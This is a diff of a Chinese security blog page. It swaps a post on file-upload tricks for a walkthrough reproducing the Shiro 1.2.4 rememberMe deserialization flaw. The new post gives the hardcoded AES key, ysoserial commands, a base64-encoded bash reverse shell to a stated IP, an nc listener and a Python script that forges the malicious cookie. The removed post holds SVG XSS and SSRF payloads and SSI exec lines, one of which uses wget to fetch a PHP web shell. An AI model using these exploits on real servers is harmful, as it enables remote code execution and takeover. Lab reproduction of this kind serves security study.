@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="文件上传,">
+  <meta name="keywords" content="java,反序列化,">
 
 
 
@@ -83,21 +83,25 @@
 
 
 
-<meta name="description" content="0x00 前言在实际环境中，可能会遇到各种各样的上传点，但是服务端肯定会做各种限制导致脚本无法上传或者上传后限制了解析。那么在这种情况下如何去挖掘上传点的其他一些利用方式呢，下面看一下大佬们的其他骚操作。 0x01 XSS关于利用文件上传的XSS,早在16年大佬就给出了多种利用方式：File Upload XSS 文件名xsswindows下文件名不能包含 / \ : * ? “ &amp;lt; &amp;gt">
-<meta name="keywords" content="文件上传">
+<meta name="description" content="0x00 前言在官网中可以得到该漏洞的描述，主要原因是因为shiro默认使用了CookieRememberMeManager, 其处理cookie的流程是：得到rememberMe的cookie值–&amp;gt;Base64解码–&amp;gt;AES解密–&amp;gt;反序列化。然而AES的密钥是硬编码的，其密钥硬编码在代码中为kPH+bIxk5D2deZiIxcaaaA==。导致攻击者可以构造任意数据从而造成反序">
+<meta name="keywords" content="java,反序列化">
 <meta property="og:type" content="article">
-<meta property="og:title" content="文件上传功能的一些另类利用">
-<meta property="og:url" content="http://zhengbao.wang/文件上传功能的一些另类利用/index.html">
+<meta property="og:title" content="shiro 1.2.4反序列化漏洞复现">
+<meta property="og:url" content="http://zhengbao.wang/shiro-1-2-4反序列化漏洞复现/index.html">
 <meta property="og:site_name" content="Boogle&#39;s Blog">
-<meta property="og:description" content="0x00 前言在实际环境中，可能会遇到各种各样的上传点，但是服务端肯定会做各种限制导致脚本无法上传或者上传后限制了解析。那么在这种情况下如何去挖掘上传点的其他一些利用方式呢，下面看一下大佬们的其他骚操作。 0x01 XSS关于利用文件上传的XSS,早在16年大佬就给出了多种利用方式：File Upload XSS 文件名xsswindows下文件名不能包含 / \ : * ? “ &amp;lt; &amp;gt">
+<meta property="og:description" content="0x00 前言在官网中可以得到该漏洞的描述，主要原因是因为shiro默认使用了CookieRememberMeManager, 其处理cookie的流程是：得到rememberMe的cookie值–&amp;gt;Base64解码–&amp;gt;AES解密–&amp;gt;反序列化。然而AES的密钥是硬编码的，其密钥硬编码在代码中为kPH+bIxk5D2deZiIxcaaaA==。导致攻击者可以构造任意数据从而造成反序">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.loli.net/2019/04/20/5cbb33464fbca.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/20/5cbb3846adbf8.png">
-<meta property="og:updated_time" content="2019-04-20T15:36:40.243Z">
+<meta property="og:image" content="https://i.loli.net/2019/11/19/cA4quePmpQBEyVi.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/19/gnPpdaBmHxc9vjD.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/19/Jx3bFv8ltQXAKD5.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/19/SrUHc9ejEMCgTpG.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/19/FrNWE3SYXj1kdI4.png">
+<meta property="og:image" content="c:/Users/14737/AppData/Roaming/Typora/typora-user-images/1574149518940.png">
+<meta property="og:updated_time" content="2019-11-19T07:46:35.123Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="文件上传功能的一些另类利用">
-<meta name="twitter:description" content="0x00 前言在实际环境中，可能会遇到各种各样的上传点，但是服务端肯定会做各种限制导致脚本无法上传或者上传后限制了解析。那么在这种情况下如何去挖掘上传点的其他一些利用方式呢，下面看一下大佬们的其他骚操作。 0x01 XSS关于利用文件上传的XSS,早在16年大佬就给出了多种利用方式：File Upload XSS 文件名xsswindows下文件名不能包含 / \ : * ? “ &amp;lt; &amp;gt">
-<meta name="twitter:image" content="https://i.loli.net/2019/04/20/5cbb33464fbca.png">
+<meta name="twitter:title" content="shiro 1.2.4反序列化漏洞复现">
+<meta name="twitter:description" content="0x00 前言在官网中可以得到该漏洞的描述，主要原因是因为shiro默认使用了CookieRememberMeManager, 其处理cookie的流程是：得到rememberMe的cookie值–&amp;gt;Base64解码–&amp;gt;AES解密–&amp;gt;反序列化。然而AES的密钥是硬编码的，其密钥硬编码在代码中为kPH+bIxk5D2deZiIxcaaaA==。导致攻击者可以构造任意数据从而造成反序">
+<meta name="twitter:image" content="https://i.loli.net/2019/11/19/cA4quePmpQBEyVi.png">
 
 
 
@@ -127,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://zhengbao.wang/文件上传功能的一些另类利用/">
+  <link rel="canonical" href="http://zhengbao.wang/shiro-1-2-4反序列化漏洞复现/">
 
 
 
 
 
-  <title>文件上传功能的一些另类利用 | Boogle's Blog</title>
+  <title>shiro 1.2.4反序列化漏洞复现 | Boogle's Blog</title>
   
 
 
@@ -305,7 +309,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://zhengbao.wang/文件上传功能的一些另类利用/">
+    <link itemprop="mainEntityOfPage" href="http://zhengbao.wang/shiro-1-2-4反序列化漏洞复现/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="boogle">
@@ -322,7 +326,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">文件上传功能的一些另类利用</h1>
+          <h1 class="post-title" itemprop="name headline">shiro 1.2.4反序列化漏洞复现</h1>
         
 
         <div class="post-meta">
@@ -334,8 +338,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-20T23:35:16+08:00">
-                2019-04-20
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-19T14:49:51+08:00">
+                2019-11-19
               </time>
             
 
@@ -375,8 +379,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/文件上传功能的一些另类利用/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/文件上传功能的一些另类利用/" itemprop="commentCount"></span>
+                <a href="/shiro-1-2-4反序列化漏洞复现/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/shiro-1-2-4反序列化漏洞复现/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -384,7 +388,7 @@
 
           
           
-             <span id="/文件上传功能的一些另类利用/" class="leancloud_visitors" data-flag-title="文件上传功能的一些另类利用">
+             <span id="/shiro-1-2-4反序列化漏洞复现/" class="leancloud_visitors" data-flag-title="shiro 1.2.4反序列化漏洞复现">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -409,7 +413,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  638 字
+                  452 字
                 </span>
               
 
@@ -446,15 +450,30 @@
       
 
       
-        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在实际环境中，可能会遇到各种各样的上传点，但是服务端肯定会做各种限制导致脚本无法上传或者上传后限制了解析。那么在这种情况下如何去挖掘上传点的其他一些利用方式呢，下面看一下大佬们的其他骚操作。</p>
-<h2 id="0x01-XSS"><a href="#0x01-XSS" class="headerlink" title="0x01 XSS"></a>0x01 XSS</h2><p>关于利用文件上传的XSS,早在16年大佬就给出了多种利用方式：<a href="http://brutelogic.com.br/blog/file-upload-xss/" target="_blank" rel="noopener">File Upload XSS</a></p>
-<h3 id="文件名xss"><a href="#文件名xss" class="headerlink" title="文件名xss"></a>文件名xss</h3><p>windows下文件名不能包含 <code>/ \ : * ? “ &lt; &gt; |</code> 字符，而linux下是可以出现除 <code>/</code> 字符之外的其它所有的字符，而且在Linux系统中可以使用长文件或目录名，直接利用这个特性，在上传点没有对文件名进行检测和处理的情况下就可以实现XSS攻击。</p>
-<h3 id="svg文件"><a href="#svg文件" class="headerlink" title="svg文件"></a>svg文件</h3><p>svg它的英文全称为Scalable Vector Graphics，意思为可缩放的矢量图形，是一种图片文件格式。当服务端允许上传svg类型的文件时，可进行Xss。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg <span class="attribute">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attribute">onload</span>=<span class="string">"alert("</span>svg-xss")/&gt;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2019/04/20/5cbb33464fbca.png" alt></p>
-<h2 id="0x02-SSI-Injection"><a href="#0x02-SSI-Injection" class="headerlink" title="0x02 SSI Injection"></a>0x02 SSI Injection</h2><p>SSI是英文Server Side Includes的缩写，翻译成中文就是服务器端包含的意思。从技术角度上说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针。SSI具有强大的功能，只要使用一条简单的SSI命令就可以实现整个网站的内容更新，时间和日期的动态显示，以及执行shell和CGI脚本程序等复杂的功能。<br>详细参考<a href="https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injection" target="_blank" rel="noopener">https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injection</a></p>
-<p>也就说一个web服务如果开启了SSI功能，即可通过上传<code>shtml</code>进行文件读取甚至命令执行。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">Linux:</span><br><span class="line"></span><br><span class="line">List files <span class="keyword">of</span> directory:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="ls" --&gt;</span><br><span class="line">Access directories:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="cd /root/dir/"&gt;</span><br><span class="line">Execution script:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" --&gt;</span><br><span class="line">Windows:</span><br><span class="line"></span><br><span class="line">List files <span class="keyword">of</span> directory:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="dir" --&gt;</span><br><span class="line">Access directories:</span><br><span class="line"></span><br><span class="line">&lt;!--#exec cmd="cd C:\admin\dir"&gt;</span><br></pre></td></tr></table></figure></p>
-<h2 id="0X03-SSRF"><a href="#0X03-SSRF" class="headerlink" title="0X03 SSRF"></a>0X03 SSRF</h2><p>参考<a href="https://nosec.org/home/detail/2305.html" target="_blank" rel="noopener">利用SVG图片和SSRF收集服务器内部信息</a><br>该利用同样需要支持上传<code>svg</code>文件，由于它是xml结构，所以支持各种xml特性，其中一个特性是XLink，支持在xml文档中创建内部或外部的超链接。<br>上传<code>ssrf.xml</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns:svg</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">width</span>=<span class="string">"200"</span> <span class="attr">height</span>=<span class="string">"200"</span>&gt;</span><span class="tag">&lt;<span class="name">image</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">xlink:href</span>=<span class="string">"http://192.168.111.149:3000/?ssrfsvg"</span> /&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2019/04/20/5cbb3846adbf8.png" alt></p>
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在官网中可以得到该漏洞的描述，主要原因是因为shiro默认使用了<code>CookieRememberMeManager</code>, 其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码的，其密钥硬编码在代码中为<code>kPH+bIxk5D2deZiIxcaaaA==</code>。导致攻击者可以构造任意数据从而造成反序列化漏洞。 </p>
+<p><img src="https://i.loli.net/2019/11/19/cA4quePmpQBEyVi.png" alt></p>
+<p>漏洞影响版本为<code>shiro &lt;= 1.2.4</code></p>
+<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>使用docker快速搭建漏洞环境</p>
+<p><code>docker pull medicean/vulapps:s_shiro_1</code> </p>
+<p><code>docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1</code></p>
+<p><img src="https://i.loli.net/2019/11/19/gnPpdaBmHxc9vjD.png" alt></p>
+<h3 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h3><p>获取java反序列化利用神器<code>ysoserial</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git　<span class="built_in">clone</span> https://github.com/frohoff/ysoserial.git</span><br><span class="line"><span class="built_in">cd</span> ysoserial</span><br><span class="line">mvn package -DskipTests</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用<code>ysoserial</code>中JRMP监听模块并配置监听端口，添加要执行的命令。这里执行反弹shell命令<code>bash -i &gt;&amp; /dev/tcp/192.168.111.140/8888 0&gt;&amp;1</code></p>
+<p>这里命令需要进行一下base64编码 <a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<p><img src="https://i.loli.net/2019/11/19/Jx3bFv8ltQXAKD5.png" alt></p>
+<p>然后执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JPListener 3888 CommonsCollections4 <span class="string">'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMS4xNDAvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span></span><br></pre></td></tr></table></figure>
+<p>然后监听本地<code>8888</code>端口，等待反弹shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
+<p>使用如下脚本得到构造好的<code>rememberMe</code>值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span>, <span class="string">'JRMPClient'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])    </span><br><span class="line"><span class="keyword">print</span> <span class="string">"rememberMe=&#123;0&#125;"</span>.format(payload.decode())</span><br></pre></td></tr></table></figure>
+<p>使用方法<code>python shiro_rce.py ip:port</code>，其中ip和port为上面启动<code>ysoserial</code>JRMP的ip地址和端口号</p>
+<p><img src="https://i.loli.net/2019/11/19/SrUHc9ejEMCgTpG.png" alt></p>
+<p>然后进行抓包，将cookie中的<code>remeberMe</code>值替换即可。</p>
+<p><img src="https://i.loli.net/2019/11/19/FrNWE3SYXj1kdI4.png" alt></p>
+<p>然后便可收到反弹回的shell</p>
+<p><img src="C:\Users\14737\AppData\Roaming\Typora\typora-user-images\1574149518940.png" alt="1574149518940"></p>
 
       
     </div>
@@ -471,12 +490,12 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/文件上传功能的一些另类利用/">文件上传功能的一些另类利用</a></p>
+  <p><span>本文标题:</span><a href="/shiro-1-2-4反序列化漏洞复现/">shiro 1.2.4反序列化漏洞复现</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 boogle 的个人博客">boogle</a></p>
-  <p><span>发布时间:</span>2019年04月20日 - 23:35</p>
-  <p><span>最后更新:</span>2019年04月20日 - 23:36</p>
-  <p><span>原始链接:</span><a href="/文件上传功能的一些另类利用/" title="文件上传功能的一些另类利用">http://zhengbao.wang/文件上传功能的一些另类利用/</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://zhengbao.wang/文件上传功能的一些另类利用/" aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年11月19日 - 14:49</p>
+  <p><span>最后更新:</span>2019年11月19日 - 15:46</p>
+  <p><span>原始链接:</span><a href="/shiro-1-2-4反序列化漏洞复现/" title="shiro 1.2.4反序列化漏洞复现">http://zhengbao.wang/shiro-1-2-4反序列化漏洞复现/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://zhengbao.wang/shiro-1-2-4反序列化漏洞复现/" aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -535,7 +554,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/文件上传/" rel="tag"><i class="fa fa-tag"></i> 文件上传</a>
+            <a href="/tags/java/" rel="tag"><i class="fa fa-tag"></i> java</a>
+          
+            <a href="/tags/反序列化/" rel="tag"><i class="fa fa-tag"></i> 反序列化</a>
           
         </div>
       
@@ -548,8 +569,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/java代码审计入门之s2-002复现分析/" rel="next" title="java代码审计入门之s2-002复现分析">
-                <i class="fa fa-chevron-left"></i> java代码审计入门之s2-002复现分析
+              <a href="/rConfig远程代码执行漏洞复现/" rel="next" title="rConfig远程代码执行漏洞复现">
+                <i class="fa fa-chevron-left"></i> rConfig远程代码执行漏洞复现
               </a>
             
           </div>
@@ -558,8 +579,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/XSSRF攻击内网redis/" rel="prev" title="XSSRF攻击内网redis">
-                XSSRF攻击内网redis <i class="fa fa-chevron-right"></i>
+              <a href="/java反序列化入门/" rel="prev" title="java反序列化入门">
+                java反序列化入门 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -755,7 +776,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-XSS"><span class="nav-number">2.</span> <span class="nav-text">0x01 XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#文件名xss"><span class="nav-number">2.1.</span> <span class="nav-text">文件名xss</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#svg文件"><span class="nav-number">2.2.</span> <span class="nav-text">svg文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-SSI-Injection"><span class="nav-number">3.</span> <span class="nav-text">0x02 SSI Injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X03-SSRF"><span class="nav-number">4.</span> <span class="nav-text">0X03 SSRF</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-漏洞复现"><span class="nav-number">2.</span> <span class="nav-text">0x01 漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境准备"><span class="nav-number">2.1.</span> <span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具准备"><span class="nav-number">2.2.</span> <span class="nav-text">工具准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li></ol></div>
             
 
           </div>
